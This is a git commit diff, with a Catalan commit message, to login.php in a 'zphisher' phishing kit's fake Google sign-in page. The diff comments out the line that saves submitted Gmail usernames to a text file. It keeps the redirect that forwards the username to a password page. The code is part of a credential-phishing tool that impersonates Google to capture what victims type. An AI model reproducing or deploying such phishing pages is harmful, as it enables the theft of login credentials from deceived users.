0b986b1b42ecda6bfd7a8ef58d9944ef7739a109
Girquell <girquell@gmail.com>
2023-04-25 12:40:14 +0200

    modificacions arxius php i html 25/04 a les 12:40

--- zphisher-master/.sites/google_new/login.php
+++ zphisher-master/.sites/google_new/login.php
@@ -1,6 +1,7 @@
 <?php
 
-file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . "\n", FILE_APPEND);
+//file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . "\n", FILE_APPEND);
 header('Location: password.php?username='.$_POST['username']);
 exit();
+
 ?>
